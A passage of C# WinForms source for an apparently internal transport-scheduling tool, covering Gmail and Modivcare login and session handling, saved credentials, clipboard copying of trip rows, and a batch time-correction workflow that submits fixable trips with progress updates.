            if (!ScheduleBuilderGmailDefaults.TryGet(out string address, out _))
            {
                MessageBox.Show(
                    "Office Gmail is not configured yet.\r\n\r\n"
                    + "An admin fills this in once before distributing the app:\r\n"
                    + ScheduleBuilderGmailDefaults.ConfigPath,
                    "Gmail",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                return;
            }

            Properties.Settings.Default.gmailUseOfficeDefault = true;
            try { Properties.Settings.Default.Save(); } catch { /* best effort */ }

            loginCB.SelectedIndex = 3;
            ApplyGmailOfficeDefaultUi(address);
        }

        private void BeginGmailPersonalEntryIfOfficeMode()
        {
            if (loginCB == null || loginCB.SelectedIndex != 3)
                return;
            if (!Properties.Settings.Default.gmailUseOfficeDefault)
                return;

            Properties.Settings.Default.gmailUseOfficeDefault = false;
            try { Properties.Settings.Default.Save(); } catch { /* best effort */ }

            loginUserTB.Text = string.Empty;
            loginPassTB.Text = string.Empty;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Enabled = true;
            loginBtn.Text = "Test my Gmail";
            SetWrPbLightImage(0);
        }

        private async Task GmailLoginTestAsync()
        {
            loginCB.SelectedIndex = 3;
            string address = (loginUserTB.Text ?? string.Empty).Trim();
            string password = loginPassTB.Text ?? string.Empty;

            if (string.IsNullOrEmpty(address) || string.IsNullOrEmpty(password))
            {
                MessageBox.Show(
                    "Enter your own Gmail address and App Password, then click Test my Gmail.\r\n\r\n"
                    + "Or click Use office email — no login needed for other users.");
                return;
            }

            await SetLoadingGifLabel("Gmail: testing SMTP login…");
            try
            {
                await ScheduleBuilderGmailMailer.TestConnectionAsync(address, password).ConfigureAwait(true);
                Properties.Settings.Default.gmailUseOfficeDefault = false;
                GmailSaveCredentials(address, password);
                loginPassTB.Enabled = true;
                loginSwitch.Enabled = true;
                DisableGmailLogin();
            }
            catch (Exception ex)
            {
                string detail = ex.Message ?? "Unknown error";
                if (ex.InnerException != null && !string.IsNullOrWhiteSpace(ex.InnerException.Message))
                    detail = ex.Message + "\r\n\r\n" + ex.InnerException.Message;
                MessageBox.Show(
                    "Gmail login failed.\r\n\r\n" + detail,
                    "Gmail",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                EnableGmailLogin();
            }
        }

        private void GmailSaveCredentials(string user, string pass, bool userInitiatedLogin = true)
        {
            try
            {
                ScheduleBuilderGmailMailer.NormalizeCredentials(ref user, ref pass);
                if (loginSwitch.Checked == false)
                {
                    if (userInitiatedLogin)
                    {
                        Properties.Settings.Default.gmailUserName = string.Empty;
                        Properties.Settings.Default.gmailUserPass = string.Empty;
                        Properties.Settings.Default.Save();
                    }
                    return;
                }

                Properties.Settings.Default.gmailUserName = user ?? string.Empty;
                Properties.Settings.Default.gmailUserPass = pass ?? string.Empty;
                Properties.Settings.Default.Save();
            }
            catch
            {
                // Settings may be unavailable in odd scenarios.
            }
        }

        //Modivcare Login Functions, Handlers etc
        public void InitializeMCLoginHandler()
        {
            mcLoginHandler = new MCLoginHandler();
            mcLoginHandler.PropertyChanged += UpdateMCConnectionStatus;
            // Seed cached creds from settings so EnsureModivcareSessionAsync/ReconnectAsync can self-heal even
            // on a cold start where the user hasn't manually signed in yet this session.
            try
            {
                var savedUser = Properties.Settings.Default.mcUserName ?? "";
                var savedPass = Properties.Settings.Default.mcUserPass ?? "";
                if (!string.IsNullOrWhiteSpace(savedUser) && !string.IsNullOrEmpty(savedPass))
                    mcLoginHandler.PrimeCachedCredentials(savedUser.Trim(), savedPass);
            }
            catch
            {
                // Settings may be unavailable in odd hosting scenarios; swallow — the manual login path still works.
            }
        }
        private async Task MCLogin()
        {
            if (manuallogin)
            {
                ShowLoadingGif();
            }
            loginCB.SelectedIndex = 1; loginCB.Focus();
            string username = loginUserTB.Text ?? "";
            string password = loginPassTB.Text ?? "";
            if (username == "" || password == "")
            {
                hidegiftimer.Start();
                MessageBox.Show("Login information not entered.");
                return;
            }

            await PerformModivcareLoginWithCredentialsAsync(username, password, saveOnSuccess: true);

            if (manuallogin)
            {
                hidegiftimer.Start();
            }
        }

        /// <summary>POST Modivcare login; optional save when Remember credentials applies.</summary>
        private async Task PerformModivcareLoginWithCredentialsAsync(
            string username, string password, bool saveOnSuccess, bool userInitiatedLogin = true)
        {
            await mcLoginHandler.Login(username, password);
            if (mcLoginHandler.Connected && saveOnSuccess)
                SaveMCCredentials(username, password, userInitiatedLogin);
        }

        /// <summary>
        /// Called by MC entry points when an inner method threw <see cref="ModivcareSessionExpiredException"/>
        /// mid-operation. Forces a synchronous reconnect via cached creds so the user's retry click is instant,
        /// and surfaces a friendly message. Safe to call from any handler — never throws.
        /// </summary>
        private async Task HandleModivcareSessionExpiredAsync()
        {
            try { await mcLoginHandler.ResetConnection(); }
            catch { /* the probe in EnsureModivcareSessionAsync will retry on the next click */ }
            try { loadinggifhandler_hidescreen(); } catch { }
            MessageBox.Show(
                "Your Modivcare session expired during this operation.\n\n" +
                "We've reconnected for you — please try again.",
                "Modivcare session expired",
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// If not connected, signs in using Modivcare tab fields or saved settings, then returns whether Modivcare is ready.
        /// When already <see cref="MCLoginHandler.Connected"/>, also probes the server cookie so a 1–2 hour idle that
        /// silently expired the session is caught here rather than failing the user's first click. Caller continues
        /// the same action after this returns true.
        /// </summary>
        private async Task<bool> EnsureModivcareSessionAsync()
        {
            if (mcLoginHandler != null && mcLoginHandler.Connected)
            {
                await SetLoadingGifLabel("Checking connections");
                bool alive;
                try
                {
                    alive = await mcLoginHandler.ProbeSessionAsync();
                }
                catch
                {
                    alive = false;
                }
                if (alive)
                    return true;

                if (mcLoginHandler.LastProbeWasUnreachable)
                {
                    MessageBox.Show(
                        ModivcareRequestErrors.UnreachableMessage,
                        "Modivcare",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    return false;
                }

                // Server-side session is dead. Suppress the PropertyChanged auto-relogin while we re-auth in-band
                // so it doesn't double-fire MCLogin() (which would run on screen creds and may MessageBox).
                mcLoginHandler.PropertyChanged -= UpdateMCConnectionStatus;
                bool reconnected = false;
                try
                {
                    await SetLoadingGifLabel("Reconnecting to Modivcare");
                    reconnected = await mcLoginHandler.ReconnectAsync();
                }
                catch
                {
                    reconnected = false;
                }
                finally
                {
                    mcLoginHandler.PropertyChanged += UpdateMCConnectionStatus;
                }

                if (reconnected && mcLoginHandler.Connected)
                {
                    DisableMCLogin();
                    return true;
                }
                // Fall through to credential-based login below (handles first-run / no cached creds).
            }

            string username;
            string password;
            if (loginCB.SelectedIndex == 1)
            {
                username = (loginUserTB.Text ?? "").Trim();
                password = loginPassTB.Text ?? "";
            }
            else
            {
                username = (Properties.Settings.Default.mcUserName ?? "").Trim();
                password = Properties.Settings.Default.mcUserPass ?? "";
            }
            if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                MessageBox.Show("Modivcare is not signed in. Use the Modivcare tab to sign in, or save credentials with Remember credentials.");
                return false;
            }

            await SetLoadingGifLabel("Signing in to Modivcare");
            mcLoginHandler.PropertyChanged -= UpdateMCConnectionStatus;
            try
            {
                await PerformModivcareLoginWithCredentialsAsync(
                    username, password, saveOnSuccess: true, userInitiatedLogin: false);
            }
            finally
            {
                mcLoginHandler.PropertyChanged += UpdateMCConnectionStatus;
            }

            if (!mcLoginHandler.Connected)
            {
                if (mcLoginHandler.LastProbeWasUnreachable)
                {
                    MessageBox.Show(
                        ModivcareRequestErrors.UnreachableMessage,
                        "Modivcare",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                }
                else
                {
                    MessageBox.Show("Modivcare login was not accepted.");
                }
                EnableMCLogin();
                return false;
            }
            DisableMCLogin();
            return true;
        }
        private void LoadMCCredentials()
        {
            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.mcUserName))
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = Properties.Settings.Default.mcUserName;
                loginPassTB.Text = Properties.Settings.Default.mcUserPass ?? "";
                loginSwitch.Checked = true;
            }
            else
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = "";
                loginPassTB.Text = "";
                loginSwitch.Checked = false;
            }
        }
        private void SaveMCCredentials(string user, string pass, bool userInitiatedLogin = true)
        {
            string username = user;
            string password = pass;

            try
            {
                if (loginSwitch.Checked == false)
                {
                    if (userInitiatedLogin)
                    {
                        Properties.Settings.Default.mcUserName = "";
                        Properties.Settings.Default.mcUserPass = "";
                        Properties.Settings.Default.Save();
                    }
                    return;
                }

                Properties.Settings.Default.mcUserName = username;
                Properties.Settings.Default.mcUserPass = password;
                Properties.Settings.Default.Save();
                // Keep the in-memory reconnect cache aligned with what we just persisted so a later
                // password rotation here also fixes auto-reconnect, even before the user restarts.
                mcLoginHandler?.PrimeCachedCredentials(username, password);
            }
            catch
            {
                Console.WriteLine("There was a problem saving credentials");
            }
        }
        private void EnableMCLogin()
        {
            //loginConnLbl.Text = "Wellryde: Not Connected";
            SetWrPbLightImage(0);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Text = "Login";
            loginCB.SelectedIndex = 1;
            loginCB.Focus();
        }
        private void DisableMCLogin()
        {
            //loginConnLbl.Text = "Wellryde: Connected";
            SetWrPbLightImage(1);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = false;
            loginPassTB.Enabled = false;
            loginSwitch.Enabled = false;
            loginBtn.Text = "Logout";
            loginCB.SelectedIndex = 1;
        }
        public async void UpdateMCConnectionStatus(object source, EventArgs args)
        {
            if (mcLoginHandler.Connected == true)
            {
                DisableMCLogin();
            }
            else
            {
                EnableMCLogin();
                if (!mcLoginHandler.IntentionalLogout)
                {
                    await SetLoadingGifLabel("Logging into Modivcare");
                    await MCLogin();
                }
            }
        }
















        private async void button1_Click(object sender, EventArgs e)
        {
            await mcLoginHandler.Logout();
            mcLoginHandler.IntentionalLogout = false;
        }

        //Modivcare

        //Time Corrections — trip list right-click: copy for review / chat paste
        private ContextMenuStrip _tcTripListCtxMenu;
        private ToolStripMenuItem _tcTripListCtxCopySelected;
        private ToolStripMenuItem _tcTripListCtxCopyAll;
        private ToolStripMenuItem _tcTripListCtxCopyFixable;

        private void BuildTimeCorrectionTripListContextMenu()
        {
            if (tctripcorrectlv == null) return;

            _tcTripListCtxMenu = new ContextMenuStrip
            {
                Renderer = new DarkContextMenuRenderer(),
                BackColor = DarkContextMenuRenderer.Background,
                ForeColor = DarkContextMenuRenderer.ForeColor,
                ShowImageMargin = true,
            };

            _tcTripListCtxCopySelected = new ToolStripMenuItem("Copy selected trips")
            {
                BackColor = DarkContextMenuRenderer.Background,
                ForeColor = DarkContextMenuRenderer.ForeColor,
                ShortcutKeys = Keys.Control | Keys.C,
                ShowShortcutKeys = true,
                Image = MenuIconFactory.GetCopyIcon(),
            };
            _tcTripListCtxCopySelected.Click += (s, e) => CopyTimeCorrectionTripsToClipboard(TimeCorrectionCopyScope.Selected);

            _tcTripListCtxCopyAll = new ToolStripMenuItem("Copy all trips")
            {
                BackColor = DarkContextMenuRenderer.Background,
                ForeColor = DarkContextMenuRenderer.ForeColor,
                ShortcutKeys = Keys.Control | Keys.Shift | Keys.C,
                ShowShortcutKeys = true,
                Image = MenuIconFactory.GetCopyAllIcon(),
            };
            _tcTripListCtxCopyAll.Click += (s, e) => CopyTimeCorrectionTripsToClipboard(TimeCorrectionCopyScope.All);

            _tcTripListCtxCopyFixable = new ToolStripMenuItem("Copy fixable trips only")
            {
                BackColor = DarkContextMenuRenderer.Background,
                ForeColor = DarkContextMenuRenderer.ForeColor,
                Image = MenuIconFactory.GetCopyIcon(),
            };
            _tcTripListCtxCopyFixable.Click += (s, e) => CopyTimeCorrectionTripsToClipboard(TimeCorrectionCopyScope.FixableOnly);

            _tcTripListCtxMenu.Items.Add(_tcTripListCtxCopySelected);
            _tcTripListCtxMenu.Items.Add(_tcTripListCtxCopyAll);
            _tcTripListCtxMenu.Items.Add(_tcTripListCtxCopyFixable);

            tctripcorrectlv.MouseUp += TimeCorrectionTripList_MouseUp_ShowContextMenu;
        }

        private enum TimeCorrectionCopyScope { Selected, All, FixableOnly }

        private void TimeCorrectionTripList_MouseUp_ShowContextMenu(object sender, MouseEventArgs e)
        {
            if (e.Button != MouseButtons.Right) return;
            if (tctripcorrectlv == null) return;

            int selected = tctripcorrectlv.SelectedItems.Count;
            int total = tctripcorrectlv.Items.Count;
            int fixable = 0;
            foreach (ListViewItem row in tctripcorrectlv.Items)
            {
                if (string.Equals(row.Text, "Fixable", StringComparison.OrdinalIgnoreCase))
                    fixable++;
            }

            _tcTripListCtxCopySelected.Enabled = selected > 0;
            _tcTripListCtxCopySelected.Text = selected > 1
                ? "Copy " + selected + " selected trips"
                : "Copy selected trip";
            _tcTripListCtxCopyAll.Enabled = total > 0;
            _tcTripListCtxCopyFixable.Enabled = fixable > 0;
            _tcTripListCtxCopyFixable.Text = fixable == 1
                ? "Copy fixable trip only"
                : "Copy fixable trips only (" + fixable + ")";

            _tcTripListCtxMenu.Show(tctripcorrectlv, e.Location);
        }

        private void CopyTimeCorrectionTripsToClipboard(TimeCorrectionCopyScope scope)
        {
            if (tctripcorrectlv == null || tctripcorrectlv.Items.Count == 0)
                return;

            var rows = new List<ListViewItem>();
            switch (scope)
            {
                case TimeCorrectionCopyScope.Selected:
                    if (tctripcorrectlv.SelectedItems.Count == 0) return;
                    foreach (ListViewItem r in tctripcorrectlv.SelectedItems)
                        rows.Add(r);
                    break;
                case TimeCorrectionCopyScope.All:
                    foreach (ListViewItem r in tctripcorrectlv.Items)
                        rows.Add(r);
                    break;
                case TimeCorrectionCopyScope.FixableOnly:
                    foreach (ListViewItem r in tctripcorrectlv.Items)
                    {
                        if (string.Equals(r.Text, "Fixable", StringComparison.OrdinalIgnoreCase))
                            rows.Add(r);
                    }
                    if (rows.Count == 0) return;
                    break;
            }

            var sb = new StringBuilder();
            for (int c = 0; c < tctripcorrectlv.Columns.Count; c++)
            {
                if (c > 0) sb.Append('\t');
                sb.Append(SanitizeClipboardField(tctripcorrectlv.Columns[c].Text));
            }
            sb.AppendLine();

            foreach (ListViewItem row in rows)
            {
                // SubItems[0] is the first column (same as row.Text); do not copy Text + all SubItems or Status duplicates.
                for (int c = 0; c < tctripcorrectlv.Columns.Count; c++)
                {
                    if (c > 0) sb.Append('\t');
                    string cell = c < row.SubItems.Count ? row.SubItems[c].Text : "";
                    sb.Append(SanitizeClipboardField(cell));
                }
                sb.AppendLine();
            }

            try
            {
                Clipboard.SetText(sb.ToString());
                SetTimeCorrectionStatus("Copied " + rows.Count + " row" + (rows.Count == 1 ? "" : "s") + ".");
            }
            catch (Exception ex)
            {
                MessageBox.Show(this,
                    "Could not copy to the clipboard:\n\n" + ex.Message,
                    "Time Correction",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
            }
        }

        private static string SanitizeClipboardField(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace('\t', ' ').Replace('\r', ' ').Replace('\n', ' ');
        }

        private ColumnHeader _batchToolRunColumn;
        private bool _batchToolRunColumnAdded;

        private void EnsureBatchListToolRunColumn()
        {
            if (_batchToolRunColumnAdded || tcbatchelinkslv == null)
                return;

            _batchToolRunColumn = new ColumnHeader
            {
                Text = "Last tool run",
                Width = 175,
            };
            tcbatchelinkslv.Columns.Add(_batchToolRunColumn);
            _batchToolRunColumnAdded = true;
        }

        private void RecordTimeCorrectionBatchHistory(MCBatchLink link, bool afterExecute)
        {
            if (link == null || mcTimeCorrectionTool == null)
                return;

            EnsureBatchListToolRunColumn();

            mcTimeCorrectionTool.GetBatchTripStatusCounts(out int fixable, out int passed, out int failed,
                out int total, out string serviceDate);

            if (afterExecute)
            {
                TimeCorrectionBatchHistoryStore.RecordExecute(link.BatchID, mcTimeCorrectionTool.LoadMode,
                    fixable, passed, failed, total, serviceDate);
            }
            else
            {
                TimeCorrectionBatchHistoryStore.RecordLoad(link.BatchID, mcTimeCorrectionTool.LoadMode,
                    fixable, passed, failed, total, serviceDate);
            }

            UpdateBatchListToolRunCell(link.BatchID);
        }

        private void UpdateBatchListToolRunCell(string batchId)
        {
            if (!_batchToolRunColumnAdded || string.IsNullOrWhiteSpace(batchId))
                return;

            string summary = TimeCorrectionBatchHistoryStore.FormatListSummary(batchId);
            foreach (ListViewItem row in tcbatchelinkslv.Items)
            {
                if (row.Text != batchId)
                    continue;

                while (row.SubItems.Count < tcbatchelinkslv.Columns.Count)
                    row.SubItems.Add("");

                row.SubItems[tcbatchelinkslv.Columns.Count - 1].Text = summary;
                ListViewMinWidthEnforcer.ScheduleRecompute(tcbatchelinkslv);
                break;
            }
        }

        //Time Corrections
        private const int TimeCorrectionStatusMaxLength = 200;

        private static string ShortTimeCorrectionLoadModeLabel(TimeCorrectionLoadMode mode)
        {
            switch (mode)
            {
                case TimeCorrectionLoadMode.DataOnly:
                    return "data";
                case TimeCorrectionLoadMode.Lenient:
                    return "lenient";
                case TimeCorrectionLoadMode.ModivcareRedOnly:
                    return "red only";
                case TimeCorrectionLoadMode.ModivcareRedDataOnly:
                    return "red data";
                default:
                    return "standard";
            }
        }

        private static string FormatTimeCorrectionEta(TimeSpan ts)
        {
            if (ts.TotalHours >= 1)
                return "~" + (int)ts.TotalHours + "h " + ts.Minutes + "m";
            if (ts.TotalMinutes >= 1)
                return "~" + (int)ts.TotalMinutes + "m";
            return "~" + Math.Max(0, (int)ts.TotalSeconds) + "s";
        }

        private void SetTimeCorrectionStatus(string message, TimeSpan? eta = null)
        {
            if (tcorrectstatuslbl == null || tcorrectstatuslbl.IsDisposed)
                return;

            string text = message ?? string.Empty;
            if (!text.StartsWith("Status:", StringComparison.OrdinalIgnoreCase))
                text = "Status: " + text;

            if (eta.HasValue && eta.Value > TimeSpan.Zero)
                text += " · ETA " + FormatTimeCorrectionEta(eta.Value);

            if (text.Length > TimeCorrectionStatusMaxLength)
                text = text.Substring(0, TimeCorrectionStatusMaxLength - 1) + "…";

            tcorrectstatuslbl.Text = text;
        }

        private async void tcfindbatchesbtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            await SetLoadingGifLabel("Checking connections");
            if (!await EnsureModivcareSessionAsync())
            {
                loadinggifhandler_hidescreen();
                return;
            }
            EnsureBatchListToolRunColumn();
            tcbatchelinkslv.Items.Clear();
            try
            {
                await mcTimeCorrectionTool.GetBatchLinks(mcLoginHandler, true);
            }
            catch (ModivcareSessionExpiredException)
            {
                await HandleModivcareSessionExpiredAsync();
                return;
            }
            await SetLoadingGifLabel("Searching for batches");
            try
            {
                foreach (MCBatchLink link in mcTimeCorrectionTool.mcBatchRecords.MCBatchLinks)
                {
                    // Add the record to our listview
                    ListViewItem lvi = new ListViewItem();

                    lvi.Text = link.BatchID;
                    lvi.SubItems.Add(link.CreateDate);
                    lvi.SubItems.Add(link.CreatedBy);
                    lvi.SubItems.Add(link.TripCount);
                    lvi.SubItems.Add(link.FailedTripCount);
                    lvi.SubItems.Add(link.RequiresAttention);
                    lvi.SubItems.Add(link.TotalBilledAmount);
                    lvi.SubItems.Add(TimeCorrectionBatchHistoryStore.FormatListSummary(link.BatchID));
                    tcbatchelinkslv.Items.Add(lvi);
                }
            }
            catch
            {
                Console.WriteLine("No batches found!");
            }
            ListViewMinWidthEnforcer.ScheduleRecompute(tcbatchelinkslv);
            await SetLoadingGifLabel("Finalizing process..");
            SetTimeCorrectionStatus(mcTimeCorrectionTool.mcBatchRecords.MCBatchLinks.Count + " batches found — select one and LOAD.");
            loadinggifhandler_hidescreen();
        }

        MCBatchLink batchlink = new MCBatchLink();
        string tcstatustext = "";
        private async void tcloadbtn_Click(object sender, EventArgs e)
        {
            if (mcTimeCorrectionTool == null)
            {
                SetTimeCorrectionStatus("Click FIND first.");
                return;
            }

            if (tcbatchelinkslv.SelectedItems.Count == 0)
            {
                SetTimeCorrectionStatus("Select a batch.");
                return;
            }

            TimeCorrectionLoadMode? loadMode = PromptTimeCorrectionLoadMode();
            if (loadMode == null)
            {
                SetTimeCorrectionStatus("Load cancelled.");
                return;
            }

            mcTimeCorrectionTool.LoadMode = loadMode.Value;

            SetTimeCorrectionStatus("Loading batch…");
            mcTimeCorrectionTool.ReportProgressAsync = SetLoadingGifLabel;
            loadinggifhandler_showscreen();

            try
            {
                await SetLoadingGifLabel("Checking connections…");
                if (!await EnsureModivcareSessionAsync())
                    return;

                WellRydePortalSession wrForBatch = null;
                if (await EnsureWellRydePortalSessionForBillingAsync())
                    wrForBatch = _wellRydeSession;

                await SetLoadingGifLabel("Refreshing batch list…");
                await mcTimeCorrectionTool.GetBatchLinks(mcLoginHandler, true);

                bool batchLoaded = false;
                foreach (MCBatchLink link in mcTimeCorrectionTool.mcBatchRecords.MCBatchLinks)
                {
                    if (link.BatchID != tcbatchelinkslv.SelectedItems[0].Text)
                        continue;

                    mcTimeCorrectionTool.mcBatchRecords.ActiveBatchLink = link.BatchLinkToken;
                    batchlink = link;
                    await mcTimeCorrectionTool.InitializeCorrections(mcLoginHandler, link, wrForBatch);
                    await SetLoadingGifLabel("Calculating driver accuracies…");
                    await LoadBtnAsync(batchlink);
                    await SetLoadingGifLabel("Finalizing…");
                    RecordTimeCorrectionBatchHistory(batchlink, afterExecute: false);
                    batchLoaded = true;
                    break;
                }

                if (!batchLoaded)
                    SetTimeCorrectionStatus("Batch not found after refresh — click FIND.");
            }
            catch (ModivcareSessionExpiredException)
            {
                await HandleModivcareSessionExpiredAsync();
            }
            catch (Exception ex)
            {
                SetTimeCorrectionStatus("Load failed — " + ex.Message);
                MessageBox.Show(this,
                    "Time Correction could not finish loading this batch.\r\n\r\n" + ex.Message,
                    "Load batch failed",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
            }
            finally
            {
                mcTimeCorrectionTool.ReportProgressAsync = null;
                loadinggifhandler_hidescreen();
            }
        }
        private async void tcexebtn_Click(object sender, EventArgs e)
        {
            if (mcTimeCorrectionTool == null)
            {
                SetTimeCorrectionStatus("Click FIND first.");
                return;
            }
            
            if (mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips.Count == 0 & mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips != null)
            {
                SetTimeCorrectionStatus("No batch loaded.");
                return;
            }
            
            timer1.Enabled = true;
            tcfindbatchesbtn.Enabled = false;
            tcloadbtn.Enabled = false;
            tcexebtn.Enabled = false;
            loadinggifhandler_showscreen();
            await SetLoadingGifLabel("Checking connections");
            if (!await EnsureModivcareSessionAsync())
            {
                timer1.Enabled = false;
                tcfindbatchesbtn.Enabled = true;
                tcloadbtn.Enabled = true;
                tcexebtn.Enabled = true;
                loadinggifhandler_hidescreen();
                return;
            }
            try
            {
                await mcTimeCorrectionTool.GetBatchLinks(mcLoginHandler, false);
                await LoadBtnAsync(batchlink);
            }
            catch (ModivcareSessionExpiredException)
            {
                timer1.Enabled = false;
                tcfindbatchesbtn.Enabled = true;
                tcloadbtn.Enabled = true;
                tcexebtn.Enabled = true;
                await HandleModivcareSessionExpiredAsync();
                return;
            }
            await SetLoadingGifLabel("Preparing to correct trips");
            int fixabletripscounter = 0;
            int currenttripcounter = 0;
            foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
            {
                if (mctrprcd.Status == "Fixable")
                {
                    fixabletripscounter += 1;
                }
            }
            try
            {
                await mcTimeCorrectionTool.GetBatchPage(mcLoginHandler, batchlink.BatchLinkToken, false);
            }
            catch (ModivcareSessionExpiredException)
            {
                timer1.Enabled = false;
                tcfindbatchesbtn.Enabled = true;
                tcloadbtn.Enabled = true;
                tcexebtn.Enabled = true;
                await HandleModivcareSessionExpiredAsync();
                return;
            }

            loadinggifhandler_hidescreen();

            RefreshAccuracyChart();

            StartTimer();

            // If a trip-loop iteration loses the session, we break out and surface ONE friendly message instead
            // of marking every subsequent trip Failed on a dead cookie.
            bool sessionLostMidLoop = false;
            foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
            {
                int numofalerts = 0;

                if (mctrprcd.Status == "Fixable")
                {
                    try
                    {
                        await mcTimeCorrectionTool.GetBatchPage(mcLoginHandler, batchlink.BatchLinkToken, false);
                        foreach (ListViewItem itemRow in this.tctripcorrectlv.Items)
                        {
                            if (itemRow.SubItems[1].Text == (mctrprcd.Date + "-" + mctrprcd.Trip))
                            {
                                currenttripcounter += 1;
                                tcstatustext = "Fixing " + currenttripcounter + "/" + fixabletripscounter;

                                itemRow.UseItemStyleForSubItems = false;
                                itemRow.BackColor = Color.OrangeRed;
                                itemRow.ForeColor = Color.Black;
                                itemRow.Text = "Delaying..";
                            }
                        }

                        await Task.Delay(5000);
                        await mcTimeCorrectionTool.GetDriverPageForSubit(mcLoginHandler, mctrprcd);

                        foreach (ListViewItem itemRow in this.tctripcorrectlv.Items)
                        {
                            if (itemRow.SubItems[1].Text == (mctrprcd.Date + "-" + mctrprcd.Trip))
                            {
                                itemRow.Text = "Sending";
                                await Task.Delay(2000);
                                await mcTimeCorrectionTool.SubmitTrip(mcLoginHandler, mctrprcd);
                                await Task.Delay(2000);
                                itemRow.Text = mctrprcd.Status;
                                if (mctrprcd.Status == "Passed")
                                {
                                    mctrprcd.Alerts = "";
                                    //itemRow.SubItems[2].Text = "";
                                    itemRow.UseItemStyleForSubItems = false;
                                    itemRow.BackColor = Color.ForestGreen;
                                    itemRow.ForeColor = Color.Black;
                                }
                                else
                                {
                                    itemRow.UseItemStyleForSubItems = false;
                                    itemRow.BackColor = Color.DarkRed;
                                    itemRow.ForeColor = Color.Black;
                                }

                                RefreshAccuracyChart();
                                break;
                            }
                        }
                    }
                    catch (ModivcareSessionExpiredException)
                    {
                        mctrprcd.Status = "Failed";
                        sessionLostMidLoop = true;
                        RefreshAccuracyChart();
                    }
                    catch 
                    {
                        mctrprcd.Status = "Failed";
                        RefreshAccuracyChart();
                    }
                }
                if (sessionLostMidLoop)
                    break;
            }
            timer1.Stop();
            tcfindbatchesbtn.Enabled = true;
            tcloadbtn.Enabled = true;
            tcexebtn.Enabled = true;
            SetTimeCorrectionStatus("Done " + currenttripcounter + "/" + fixabletripscounter + ".");
            if (sessionLostMidLoop)
                await HandleModivcareSessionExpiredAsync();

            RefreshAccuracyChart();
            ListViewMinWidthEnforcer.ScheduleRecompute(tctripcorrectlv);
            if (batchlink != null && !string.IsNullOrWhiteSpace(batchlink.BatchID))
                RecordTimeCorrectionBatchHistory(batchlink, afterExecute: true);
        }
        TimeSpan ts = new TimeSpan();
        private void StartTimer()
        {
            int fixabletripscounter = 0;
            foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
            {
                if (mctrprcd.Status == "Fixable")
                {
                    fixabletripscounter += 1;
                }
            }

            int timelefsecs = (fixabletripscounter * 10);
            ts = TimeSpan.FromSeconds(timelefsecs);

            timer1.Start();
        }
        int tensecs = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            tensecs ++;
            ts = ts - new TimeSpan(0,0,1);

            if (tensecs == 10)
            {
                int fixabletripscounter = 0;
                foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
                {
                    if (mctrprcd.Status == "Fixable")
                    {
                        fixabletripscounter += 1;
                    }
                }

                int timelefsecs = (fixabletripscounter * 10);
                ts = TimeSpan.FromSeconds(timelefsecs);
                tensecs = 0;
            }
            SetTimeCorrectionStatus(tcstatustext, ts);
        }
        private bool _tcAccuracyChartUiReady;

        private void EnsureTimeCorrectionCompanyAccuracyUi()
        {
            if (_tcAccuracyChartUiReady || materialCard11 == null)
                return;

            materialCard11.Controls.Remove(tcchart);
            materialCard11.Controls.Add(tcchart);
            tcchart.Dock = DockStyle.Fill;
            tcchart.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;

            tabPage4.Resize -= TabPage4_LayoutTimeCorrectionPanels;
            tabPage4.Resize += TabPage4_LayoutTimeCorrectionPanels;

            _tcAccuracyChartUiReady = true;
            LayoutTimeCorrectionBottomPanels();
            ConfigureAccuracyChartLayout();
            LayoutStatusLabelInCard(materialCard10, tcorrectstatuslbl);
        }

        /// <summary>
        /// Keeps the accuracy chart directly above the status bar without overlapping it.
        /// </summary>
        private void LayoutTimeCorrectionBottomPanels()
        {
            if (materialCard11 == null || materialCard10 == null || tabPage4 == null)
                return;

            const int gapPx = 8;
            const int chartHeightPx = 186;

            materialCard10.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Bottom;
            materialCard11.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Bottom;

            int bottomInset = 8;
            materialCard10.Top = tabPage4.ClientSize.Height - bottomInset - materialCard10.Height;
            materialCard11.Height = chartHeightPx;
            materialCard11.Top = materialCard10.Top - gapPx - chartHeightPx;
            materialCard11.Left = materialCard10.Left;
            materialCard11.Width = materialCard10.Width;

            materialCard10.BringToFront();
            LayoutStatusLabelInCard(materialCard10, tcorrectstatuslbl);
        }

        /// <summary>Centers status text vertically inside the slim status card without increasing card height.</summary>
        private static void LayoutStatusLabelInCard(System.Windows.Forms.Control card, System.Windows.Forms.Control label)
        {
            if (card == null || label == null || card.IsDisposed || label.IsDisposed)
                return;

            const int horizontalInset = 14;
            Rectangle client = card.ClientRectangle;
            int labelH = TextRenderer.MeasureText(
                "Status: Ay",
                label.Font,
                new Size(int.MaxValue, int.MaxValue),
                TextFormatFlags.SingleLine).Height;
            int y = Math.Max(0, (client.Height - labelH) / 2);

